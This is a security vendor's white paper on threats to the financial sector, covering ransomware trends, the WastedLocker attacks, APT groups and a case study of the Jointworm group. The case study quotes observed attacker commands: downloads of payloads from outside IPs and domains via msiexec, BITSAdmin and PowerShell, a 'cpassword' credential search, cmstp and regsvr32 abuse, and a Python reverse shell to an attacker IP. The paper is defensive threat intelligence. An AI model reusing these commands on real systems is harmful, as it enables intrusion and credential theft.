Introduction
The financial sector (comprised of banks and other financial organizations)
has always been a favorite target of cyber criminals, and it’s not hard
to understand why. The huge amounts of money passing in and out of
financial organizations on a daily basis—now in a primarily digital format—
make them a prime target for profit-focused cyber criminals.
Symantec, a division of Broadcom has examined the activity targeted at
some of our biggest financial customers since the start of 2019 and have
found that detections of both malware and ransomware on customer
networks are trending upwards.
The monthly detections in both categories have gone up and down since
the start of 2020, with ransomware detections dropping sharply in March
as the world went into lockdown due to COVID-19. However, the overall
trend for detections is still upwards, showing that financial institutions still
need to be aware of the threats that face them from cyber criminals and
other threat actors.

Financial Sector Threats

White Paper
Symantec has also been tracking the activity of a sophisticated attack group with its sights firmly set on the
financial sector. Jointworm has been involved in a campaign targeting financial services companies and IT
companies that serve financial services organizations in Europe and the U.S. This group has been active since at
least 2017, with the campaign targeting companies in the financial sector ongoing since December 2019.

Ransomware: A High-Cost Threat
Ransomware is probably the biggest threat on the cyber security landscape at the moment, with ransomware
targeting top financial sector organizations trending upwards over the 17-month period we examined. Almost
three times as many financial sector businesses were targeted with ransomware in February 2020 as in December
2019. While these numbers fell back in March, potentially due to the COVID-19 pandemic disrupting the activity
of targeted ransomware gangs, they rebounded again in April. In total, there were more than twice as many
ransomware detections on the systems of financial organizations in the first five months of 2020 as there were in
the first five months of 2019, with a clear upward trend visible in Figure 1.

The gangs behind targeted ransomware threats have become more sophisticated and dangerous in recent times.
Traditionally, ransomware actors would encrypt your system and demand a ransom to provide the decryption key.
If businesses had sufficient backups of their systems available they could generally restore their systems without
paying the ransom. However, since December 2019, targeted ransomware gangs have also been stealing the data
of the businesses they hit, and threatening to publish this stolen data if victims do not pay the ransom. By doing
this, ransomware actors have doubled their leverage, because even if a business is well-prepared and can restore
their encrypted systems from backups, they may still choose to pay the ransom so their confidential business
information is not exposed.
For banks and financial institutions, which cannot afford downtime and which also hold a huge amount of people’s
personally identifiable information (PII), this recent trend in targeted ransomware is a huge threat to their business.

The Travelex Hack
A high-profile ransomware attack on the Travelex currency exchange service at the start of 2020 underlined
how disruptive and expensive ransomware attacks can be for businesses in the financial services sector.
According to public reports on the incident, Travelex was hit with the Sodinokibi ransomware on New Year’s
Eve, with the attackers allegedly stealing 5 GB of data from the company’s systems before encrypting the
entire network. However, Travelex said it never saw evidence that the attackers did steal data from their
systems.

The true cost of
ransomware attacks is
often significantly higher
than just the cost of the
ransom itself.

The true cost of ransomware attacks is often significantly higher than just
the cost of the ransom itself. The attack caused huge disruption, forcing
Travelex’s services offline for almost a month. The Sodinokibi attackers
were originally demanding a ransom of US$6 million, with Travelex
reportedly eventually paying a ransom of $2.3 million to regain access
to their systems. Travelex’s parent company, Finablr, said in March that
the combination of the ransomware attack and the COVID-19 pandemic
would cost the firm £25 million (approx. US$33 million) in Q1 2020.

In August 2020, it was announced that Travelex was entering
administration, the U.K. equivalent of bankruptcy, with the loss of more than 1,000 jobs. The effects of the
ransomware attack and the COVID-19 pandemic were both cited as reasons behind the decision.

The advice to businesses that are hit by ransomware is generally to not pay the attackers, primarily for two reasons:
(1) if hackers continue to profit from ransomware attacks they will continue to perpetrate them, and (2) you are
dealing with criminals, so there is no guarantee that they will honor their side of the deal and provide you with a key
to decrypt your files. However, recent horror stories—such as the close to $20 million ransomware recovery costs
reportedly faced by the cities of Atlanta and Baltimore when they did not pay the requested ransoms—have led to
many businesses choosing to pay a ransom rather than risk facing significantly higher recovery costs.
The cost of paying ransoms for most businesses is also generally covered by cyber insurance. Cyber insurers are
often willing to pay the ransom if they believe the cost of paying it would be lower than the payout required for a
costly and labor-intensive recovery operation if the ransom is not paid.

Case Study: WastedLocker

Case Study
WastedLocker: Sophisticated Attack
Could have Crippled a Host of Companies
In June 2020, Symantec identified and alerted our customers to a string of attacks against large companies
by attackers attempting to deploy the WastedLocker ransomware on their networks. Among those victims
was a financial services organization in Australia. All the attempted WastedLocker attacks occurred in
largely the same way, with the same tactics, tools, and procedures used by the attackers across all victims.
The attacks begin with a malicious JavaScript-based framework known as SocGholish, tracked to more
than 150 compromised websites, which masquerades as a software update. Once the attackers gain access
to the victim’s network, they use Cobalt Strike commodity malware in tandem with a number of living-offthe-land tools to steal credentials, escalate privileges, and move across the network in order to deploy the
WastedLocker ransomware on multiple computers.

In these WastedLocker attacks,
the initial compromise involves
the SocGholish framework,
which is delivered to the victim
in a zipped file via compromised
legitimate websites.

In these WastedLocker attacks, the initial compromise involves
the SocGholish framework, which is delivered to the victim in
a zipped file via compromised legitimate websites. Symantec
found at least 150 different legitimate websites that refer traffic
to websites hosting the SocGholish zip file. We also confirmed
dozens of U.S. newspaper websites owned by the same parent
company had been compromised by SocGholish injected code.
Some of the organizations targeted by WastedLocker could
have been compromised when an employee browsed the news
on one of its websites.

The zipped file contains malicious JavaScript, masquerading as a browser update. A second JavaScript file is
then executed by wscript.exe. This JavaScript first profiles the computer using commands such as whoami,
net user, and net group, then uses PowerShell to download additional discovery-related PowerShell scripts.
Cobalt Strike is then deployed on victim machines and used to download and execute a loader for Cobalt
Strike Beacon, which can be used to execute commands, inject other processes, elevate current processes
or impersonate other processes, and upload and download files.
In order to deploy the ransomware, the attackers use the Windows Sysinternals tool PsExec to launch a
legitimate command line tool for managing Windows Defender (mpcmdrun.exe) to disable scanning of all
downloaded files and attachments, remove all installed definitions, and, in some cases, disable real-time
monitoring. After Windows Defender is disabled and services have been stopped across the organization,
PsExec is used to launch the WastedLocker ransomware itself, which then begins encrypting data and
deleting shadow volumes.
The attacks were proactively detected on a number of customer networks by Symantec’s Targeted Attack
Cloud Analytics, and we initially discovered attacks against 31 organizations based in the U.S., with further
investigation leading to the discovery of more impacted organizations, including the aforementioned
Australian financial services organization.
The attackers behind WastedLocker are skilled and experienced, capable of penetrating some of the world’s
best protected corporations, stealing credentials, and moving with ease across their networks. That this
group had financial services organizations among its targets means companies in the financial sector need
to be aware of the threat sophisticated actors like this pose, and have robust security in place to protect
their systems.

Financial Sector Threats

White Paper
APT Groups: Cyber Criminals Not the Only Concern
It is not just cyber-crime gangs that are going after companies in the financial sector - sophisticated, often nationstate-sponsored advanced persistent threat (APT) groups also have their sights set on companies in the financial
sector.
Nation-state actors, unlike cyber criminals, are not generally financially motivated, so in many cases they do not
target financial institutions, as they are often more interested in other sectors, such as government organizations.
If they do target financial institutions it can often be for intelligence gathering means, rather than to actually steal
funds from the financial institution in question. However, there have been some notable financially motivated
attacks on the financial sector by APT groups in the past.
The APT group that is best known for targeting organizations for financial gain is probably Lazarus, which the FBI
has said is a state-sponsored group backed by the North Korean government. Lazarus has been linked to numerous
high-profile attacks, including the attack on Sony Pictures in 2014, which was widely believed to be revenge for the
release of the movie The Interview, which was considered to have been offensive to North Korea’s leadership. The
group was also linked with the infamous WannaCry ransomware that caused huge disruption around the world in
2017.
In the financial world, Lazarus was linked to a series of attacks exploiting the SWIFT payment system in an attempt
to steal money from banks worldwide. The most infamous example of this was the so-called Bangladesh bank heist,
when the group attempted to steal $81 million, but due to the quick actions of bank staff eventually made off with
a lot less. A number of other attacks or attempted attacks exploiting the SWIFT banking framework have been
attributed to Lazarus over the last number of years.
FIN7 (or Fruitfly) and Carbanak are two other sophisticated groups known for their attacks on the financial sector.
These groups have some crossover with malware and tactics so are believed by some to be the same group, but
Symantec still tracks them as two separate entities. Carbanak is more focused on the financial sector, with FIN7
implicated in attacks on other sectors too. Symantec blogged about Carbanak in 2015 when the gang was exposed
as having stolen millions of dollars from hundreds of banks worldwide. At the time, we described the gang’s choice
to target banks themselves rather than bank customers as “atypical,” as at the time cyber-crime gangs were more
typically targeting bank customers rather than the banks themselves. The group compromised banks through
malware delivered in spear-phishing emails and would maintain a stealthy presence on bank networks until it was
ready to launch an attack. The group would then cash out by either transferring money from the bank to accounts
it controlled, or by hijacking ATMs to force them to dispense cash to individuals working with the gang. It was
speculated that Carbanak could have made up to $1 billion in those attack campaigns.
Carbanak has also been linked to another group, Odinaff, which Symantec wrote about in 2016. We linked the
group to a series of campaigns targeting financial organizations worldwide. The group targeted organizations in
the U.S., Hong Kong, the U.K., Australia, and other regions in the sophisticated campaign. Most of Odinaff’s victims
were in the financial sector, and the group was also observed at the time launching attacks on SWIFT users, using
malware to hide customers’ own records of SWIFT messages relating to fraudulent transactions. This is similar to
activity carried out by the Lazarus group in its attacks on banks worldwide, but there is no indication of any link
between Odinaff and the Lazarus group.
The sophisticated tactics and tools used by APT groups like Lazarus, Odinaff, and others, make them a particularly
dangerous threat for institutions in all sectors, including the financial sector.

Deep Dive: Jointworm − Sophisticated Attack Group Sets Sights on the Financial Sector
Symantec researchers recently spotted the activity of a targeted attack group that is focused on financial services
companies and IT companies that serve financial services organizations in Cyprus, Ukraine, the U.S., and Czech
Republic.
This group—dubbed Jointworm—has been active since at least August 2017 and appears to be financially
motivated. This latest campaign aimed at the financial sector appears to have started in December 2019. We
spotted Jointworm in at least seven organizations in the period from December 2019 to June 2020.

Financial Sector Threats

White Paper
Jointworm is identified by its use of a JavaScript backdoor (or EVILNUM) which is custom to the group. This
backdoor is typically delivered via malicious emails that contain a link to a ZIP archive. The archive file contains
an LNK attachment masquerading as an Office document, an Excel sheet for example, which contains malicious
JavaScript.
Its targets in this recent campaign include companies in the financial sector internationally, including those that
operate within the stock exchange markets, and some tech companies that develop technologies for use by
financial organizations (also known as fintech companies). A media company was also targeted in this campaign.
The group was able to spend a significant amount of time on the networks of some of its victims. Jointworm was
present on the network of one financial sector organization for 184 days, and another financial sector victim for 123
days.

Tools, Tactics, and Procedures
The group uses email as its initial vector and was spotted using generic, financial related lures and attachment
names. The malicious email links to an archive file on a trusted cloud provider that contains an LNK file
masquerading as a document or image. This decoy document is displayed to the user and an embedded JavaScript
file is executed to install a backdoor.
The backdoor that is installed also has a Python interpreter embedded in it, which is used by the attackers. The
attackers deploy classic living-off-the-land tactics, abusing legitimate admin tools on infected machines, to
download additional tools and malware. Legitimate tools exploited by the attackers include:
• PowerShell – PowerShell is a powerful interactive command-line interface and scripting environment included
in the Windows operating system that is frequently exploited by malicious actors to execute commands on
compromised systems.
• WMI Commands – WMI is a Windows administration feature that can be abused by attackers to execute
commands and for lateral movement on infected systems.
Both of these techniques feature in our table of the top 20 MITRE ATT&CK® techniques most-used against top
organizations in the financial sector in the period examined (see in Appendix (ii)).
Other legitimate tools leveraged by Jointworm include the following:
• msiexec – msiexec is a legitimate part of the Windows Installer Component and is used to install new
programs; however, it can also be used by malicious actors to install malware on victim machines.
• BITSAdmin – BITSAdmin is a legitimate command-line tool that can be abused by malicious actors to install
malware.
• MSXSL – MSXSL can legitimately be used to convert files from one format to another, but can also be
exploited by malicious actors to issue commands.
• CMSTP – This is the Microsoft Connection Manager Profile Installer, but it can also be abused by attackers to
execute commands and install malicious tools.
These tools are exploited and used to download and execute various malicious payloads.
The attackers use a loader (an OCX file) to provide themselves with additional capabilities. Based on the file names
used by Jointworm, it is likely the group is using these OCX files to load Metasploit and Cobalt Strike modules in
order to enable further capabilities.
The loader itself is believed to originate from a malware-as-a-service (MaaS) provider known as Golden Chicken.
This is a known group that also sells loaders to other groups, including FIN6 and the Cobalt Group.

Financial Sector Threats

White Paper
The Golden Chicken tools arrive as ActiveX (OCX) components and all contain TerraLoader code, which serves as a
common loader for various payloads, as outlined previously in the We Live Security blog:
• The attackers manually send a command to the JS or C# component to drop and execute a batch file from
one of their servers.
• That batch file writes a malicious INF file and supplies it as a parameter to the Microsoft utility cmstp.exe,
which executes a remote scriptlet specified in the INF file.
• The remote scriptlet contains obfuscated JS code that drops an OCX file and executes it via regsvr32.exe.
A lot of the group’s tools are signed with what appear to be invalid certificates. The attackers are observed
searching for any files that contain the string “cpassword”—this is related to Active Directory Group Policy files
(XML files) that contain encrypted passwords. Microsoft published the password used to encrypt these files prior
to 2012, so if the encrypted passwords are found, they are trivial to decrypt and use to move laterally across the
network or perform privilege escalation to a network admin’s account.

Case Study: Jointworm Activity Across a Financial Organization in Europe
We have insight into Jointworm’s activity on several organizations’ networks. We observed the attackers’ activity
on multiple machines in a leading European finance company that offers online trading of shares, contracts, and
international foreign exchange. The attacker had a presence on this victim’s network for more than 100 days.
Initial Access
On one machine in this organization, the first evidence of initial infection was identified as a malicious LNK file
masquerading as an Excel document using a financial lure. A malicious JavaScript file was embedded as an
alternative data stream (ADS) in the document. The user of this machine opened the file and a backdoor was
dropped and executed (media.js).
• CSIDL_SYSTEM\cscript.exe” “AINVESTMENTS VOIP SPREEDSHEET.xlsx.lnk:e.js””
• CSIDL_SYSTEM\cscript.exe” “CSIDL_PROFILE\appdata\roaming\microsoft\credentials\mediaplayer\
mediamanager\media.js”
Approximately two hours later, the attackers became active on the compromised machine. Initially, it appears the
attackers test connectivity by running the following command indicating a successful execution:
• CSIDL_SYSTEM\cmd.exe” /c success
Sixteen minutes later, the attackers launched an interactive Python interpreter session and used this to launch a
second JavaScript file:
• CSIDL_SYSTEM\cscript.exe” CSIDL_PROFILE\appdata\local\temp\reportapi.js”
At this point, there was further activity on the interactive Python shell and approximately two hours later, an OCX
loader component (msf.ocx) was executed.
• regsvr32.exe /s /i CSIDL_COMMON_APPDATA\msf.ocx
Several minutes later, an instance of PowerShell was launched but there was very little activity observed from
the attackers. At this point, the attacker activity ceased for seven days until the attackers returned and began
asset discovery activities by collecting network related information from remote machines.

Downloading Additional Tools and Malware
Password Protected Archives
On another machine following the initial intrusion, the attackers were able to install their backdoor via PsExec and
proceed to download a password protected archive containing a set of tools.

Financial Sector Threats

White Paper
The following command was observed:
• CSIDL_SYSTEM\cmd.exe /c c:&&cd CSIDL_PROFILE\appdata\roaming\microsoft\credentials\
mediaplayer&&unrar.exe x Utilities.rar -p123123 CSIDL_PROFILE\appdata\roaming\microsoft\credentials\
mediaplayer > CSIDL_PROFILE\appdata\roaming\microsoft\credentials\mediaplayer\filetoupload.txt 2>&1
The above command was used to change a directory to ‘mediaplayer’ where the attackers extract their tools. They
then ran unrar.exe using the password “123123” to extract the archive’s contents. The output is redirected to a file
that the attackers likely retrieve to confirm if the extraction process succeeded or not.
Copying Tools from Remote Shares
Several days later, on the same machine, we observed the attackers copying tools from a remote machine over
SMB.
• CSIDL_SYSTEM\cmd.exe /c copy \\139.28.37.53\webdav27368a\ccv.exe “CSIDL_PROFILE\appdata\roaming\
microsoft\credentials\mediaplayer\ccv.exe”
Similarly, we also observed the following command being used to download tools in other victims’ networks:
• CSIDL_SYSTEM\cmd.exe /c net use \\185.61.137.141\webdav0xx0x00x0 && net use /delete \\185.61.137.141\
webdav0xx0x00x0 && copy /y \\185.61.137.141\webdav0xx0x00x0\ARM.rar CSIDL_PROFILE\appdata\
roaming\microsoft\credentials\mediaplayer
Downloading Tools by Abusing System and Admin Tools
On several machines, we also observed the attackers abusing msiexec in order to download and install additional
tools used by the attackers.
• msiexec /q /i http://45.9.239.50/secupdate2021.msi
Similarly, we observed the attackers abusing BITSAdmin in order to download tools hosted on file-sharing
websites:
• bitsadmin /transfer myDownloadJob /download /priority normal https://file.io/mXCmid «CSIDL_PROFILE\
appdata\roaming\loader.ocx»
On multiple machines within the victim’s environment, PowerShell was also abused to download additional
tools:
• powershell -command “& { (New-Object Net.WebClient).DownloadFile(‘http://coinzre.website/load.ocx’,
‘CSIDL_COMMON_APPDATA\da.ocx’) }”
Identifying Assets
Leveraging their backdoor access, the attackers ran a series of commands in order to collect various information on
any assets of interest as they mapped the topology of the network.
Collecting General Information on Compromised Machines
Across several machines we saw WMIC being used in order to collect some general information on the
compromised machine, such as local storage information:
• wmic logicaldisk get caption,description,drivetype,providername,volumename
Credential Stealing
On the same machine, the attackers were observed executing a loader file (24067.ocx), presumably to load a
Metasploit module for extended remote access.
Shortly after, the attackers attempted to perform a string search for any files that contain the string “cpassword”.
• findstr /R /S /C:”cpassword” <redacted info>
The string “cpassword” is a command string found in XML files linked to group policies. Passwords extracted from
these files can be easily decrypted and abused by attackers.

Financial Sector Threats

White Paper
Shortly afterwards, the attackers executed PowerShell commands to enumerate systems and add additional
accounts for their own usage based on retrieved AD credentials.
The attackers were also observed deploying Mimikatz to dump credentials across multiple machines within victim
organizations.

Additional Tricks
Executing Arbitrary Commands Via MSXSL
In order to bypass security restrictions, the attackers were also observed employing some interesting tactics to
execute commands. On several machines, we see the attackers launch their backdoor followed by initializing an
interactive Python shell. This is shortly followed by commands similar to below being executed:
• CSIDL_PROFILE\appdata\roaming\microsoft\msxsl.exe 7345CD415EA32B8801.txt 7345CD415EA32B8801.txt
The MSXSL tool is a transformation utility that can be used to convert files from one format to another, such as XML
to a more human-readable format like HTML. However, this utility can be abused to run arbitrary commands on
both local and remote connections.
Executing Arbitrary Commands Via CMSTP
Additionally, we have observed the attackers abusing the Microsoft Connection Manager Profile Installer (CMSTP)
utility to execute arbitrary commands and install additional tools. More commonly we see this command being
abused to install Metapsloit or Cobalt Strike modules to extend backdoor access as described in this blog.
• wmic process call create “cmstp /ns /s /su C:\Users\[REDACTED]\AppData\Roaming\Microsoft\26642.inf”
• cmstp /ns /s /su CSIDL_PROFILE\appdata\roaming\microsoft\29723.inf
According to Microsoft’s documentation the flags used in the above commands are used to instruct the utility not
to install a desktop shortcut, ensure a silent install, and only install (or execute) the attackers’ command under the
guise of the current user.
Custom Python Reverse Shell
The attackers were also observed deploying a simple, custom Python reverse shell across multiple machines. This
was achieved by copying a legitimate Python interpreter executable (rev.exe) onto the infected machine and using
it to execute the Python file to establish a connection to attacker-controlled infrastructure.
• CSIDL_PROFILE\appdata\roaming\microsoft\credentials\mediaplayer\revssl\rev.exe rev.py 185.62.190.89 443

What Does Jointworm Want?
We cannot see what additional information the group is exfiltrating from its victims in this campaign, but in past
campaigns Jointworm has been seen stealing financial information from targeted companies and their customers.
This has included:
• Spreadsheets and other documents
• Internal presentations
• Software licenses
• Cookies and session information
• Email credentials
• Customer credit card information and proof of address/identity documents
This campaign seems to still be ongoing, and Jointworm has a strong focus on financial organizations and other
companies with links to the financial sector, such as fintech companies and organizations that provide IT services to
companies in the financial sector. Companies like this need to be aware that they are targets of sophisticated and
professional groups like Jointworm.

Malicious Activity: Detections Trend Upwards
Malware detections in general in Symantec’s top financial customers were also trending upwards from the start of
2019 to mid-2020, with the highest number of detections in financial customers seen in October 2019 and February
2020. While detections have dropped back somewhat since February, they remain higher than they were at the
same time in 2019. Detections in February 2020 were twice what they were in February 2019.

This is perhaps unsurprising given that a lot of the world’s largest financial institutions are U.S. based. Brazil is in
second place on the list with 19 percent of detections (almost one-in-five) which is also a significant amount. Brazil
is the largest country in South America and has a large population, which could be enough to make it a target
for criminals. After that, the detections are more spread out globally, though the U.K., which is also home to a
large number of international finance firms, also has quite a high number of detections, accounting for 9% of total
malware detections. We only have insight into activity aimed at our own customers, so the location of our customer
base also has an influence on these numbers.
The U.S. topping the list for malware detections, followed by a country in South America and then one in Europe,
demonstrates that financial sector companies globally are under threat from cyber criminals trying to get malware
onto their systems.

Network Activity: Further Insight into Cyber Criminals’ Endeavors
File-based detections just show us one part of the story as these detections block the threats that make it as far
as the machine (the endpoint). Network-based detections reveal further information about the extent of malicious
activity on organizations’ networks by detecting and blocking activity at the application layer. If a machine on a
network becomes infected, the malware is likely to attempt to contact a command and control (C&C) server, which
can also trigger these detections. Looking at the number of network detections attempting to contact a C&C server
can give us a more realistic idea about how many infected machines are on a network and a truer picture of the
extent of malicious activity in a sector.

criminals who try to exploit vulnerabilities in the content management system (CMS) or its plugins, or attempt to
use it to gain an initial foothold on target systems. Joomla and Apache Struts are also both open-source tools that
are widely used, and as a result are frequently targeted by malicious actors attempting to gain access to victim
networks. Joomla, like WordPress, is a CMS, while Apache Struts allows users to build web applications using Java.

These statistics show us that activity targeted at organizations in the financial sector is on the rise, with any
slowdown in this activity due to the COVID-19 pandemic seeming to be negligible or non-existent. Companies in the
U.S. need to be on high alert as attackers have a strong interest in the world’s largest economy, however, companies
in Europe and other large economies like the U.K. and Brazil also need to remain on high alert against cyber
criminals, and ensure they have a good security posture in place.

Conclusion
The financial sector is a tempting target for both everyday cyber criminals looking to make a quick buck, and
sophisticated nation-state actors with both financial and intelligence motivations. Businesses in this sector need to
be aware of these threats and protect their networks from them with a strong security approach.
Between January 2019 and mid-2020, we observed:
• Malware detections in companies in the financial sector trending upwards.
• Ransomware detections in companies in the financial sector trending upwards.
• High-profile, publicly reported targeted ransomware campaigns impacting companies in the financial sector.
Some of these gangs are now also stealing data from the businesses they hit and threatening to publish it in
order to exert further pressure on organizations to pay a ransom.
• Multiple companies in the financial sector being targeted by Jointworm, a sophisticated, financially motivated
attack group.
There may have been some anticipation that the COVID-19 pandemic would lead to a slowdown in cyber-criminal
activity, but that doesn’t seem to have occurred, at least among cyber actors targeting the financial sector.
The threat facing companies in the financial sector from malicious actors is significant, ongoing, and unlikely to
ease off in the future. It is something financial sector companies need to be aware of and prepared for.

Best Practices
• Deploy an integrated cyber defense platform that shares threat data from endpoint, email, web, cloud apps,
and infrastructure.
• Cyber attackers are continually updating their techniques and tools to evade conventional security controls.
Always keep these security solutions up to date with the latest protection capabilities, including machine
learning and AI, and ensure that your security architecture has the ability to incorporate new state-of-the-art
solutions with minimal disruption or cost.
• Ensure consistent enforcement of security rules and access policies across environments without disrupting
business processes.
• Ensure cyber security solutions run both in the cloud and on-premise to better protect infrastructure.
• Look to solutions that provide real-time threat information, threat analytics, content classification, and
comprehensive threat blocking data so the latest threat intelligence is current.
• Be sure to deploy identity and access management solutions to protect against the theft of executive
credentials.
• Where possible, install the latest patches on all devices, and consider an endpoint management solution with
automated patch management.
• Ensure all employees use strong passwords and enable two-factor authentication.
• Ensure the latest version of PowerShell is installed and logging is enabled.
• Restrict access to Remote Desktop Services (RDS): Only allow RDS from specific known IP addresses and
ensure usage of multi-factor authentication. Consider similar access controls for other popular admin tools so
they cannot be used by attackers to infiltrate the network undetected.
• Implement offline backups that are onsite. Ensure there are backups that are not connected to the network to
prevent them from being encrypted by ransomware.
• Test restore capability. Ensure restore capabilities support the needs of the business.
• Educate staff to ensure they understand cyber security principles and do not engage in any behaviors that
may put patients’ or customers’ data at risk.
• Improve detection and response capabilities by spreading security investments beyond prevention and
protection technologies. Faster detection and resolution times can dramatically reduce the impact of data
breaches.
• Leverage behavioral analytics technology wherever possible. Attackers frequently compromise privileged
devices or user accounts to carry out attacks, and having analytics capabilities to identify anomalous
behavior is one of the most effective ways to identify that an attack is taking place.
